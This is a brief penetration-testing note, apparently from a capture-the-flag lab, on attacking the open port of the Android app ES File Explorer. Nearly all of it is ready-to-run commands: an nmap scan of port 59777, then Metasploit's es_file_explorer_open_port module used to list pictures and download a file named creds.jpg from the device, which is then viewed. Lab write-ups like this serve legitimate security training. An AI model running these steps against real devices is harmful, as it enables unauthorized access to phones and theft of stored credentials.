# ES File Explorer File Manager

Enumeration

```bash
sudo nmap -p 59777 --open -sS -Pn
```

Exploit

```bash
msfconsole
search es file explorer

use auxiliary/scanner/http/es_file_explorer_open_port
options

set RHOSTS 10.10.10.247
exploit

show actions

set action LISTPICS
exploit

# Exploit
set action GETFILE
set ACTIONITEM /storage/emulated/0/DCIM/creds.jpg
exploit

sudo apt install feh
feh ~/.msf4/loot/20211025151836_default_10.10.10.247_getFile_410464.jpg
```
